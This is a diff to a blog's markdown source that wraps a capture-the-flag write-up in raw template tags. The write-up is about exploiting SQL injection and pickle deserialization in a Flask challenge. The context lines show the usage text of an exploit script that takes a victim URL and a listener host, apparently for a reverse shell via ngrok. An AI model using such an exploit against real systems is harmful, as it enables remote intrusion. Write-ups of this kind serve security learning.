@@ -7,6 +7,7 @@ templateEngineOverride: md
 permalink: /bloghub/picklewickle/
 ---
 
+{% raw %}
 
 ## Introduction
 In this challenge we will take advantage of Flask template filter which uses pickle library to deserialize a python object, but before, we have to analyze a simple SQL injection so we can pass our payload properly. 
@@ -107,3 +108,4 @@ if __name__ == "__main__":
         print("Usage: python3 cop_exploit.py <victim> <listener host> <port>\n") 
         print("Example: python3 cop_exploit.py http://64.227.43.113:32298 6.tcp.ngrok.io 16451")
 ```
+{% endraw %}
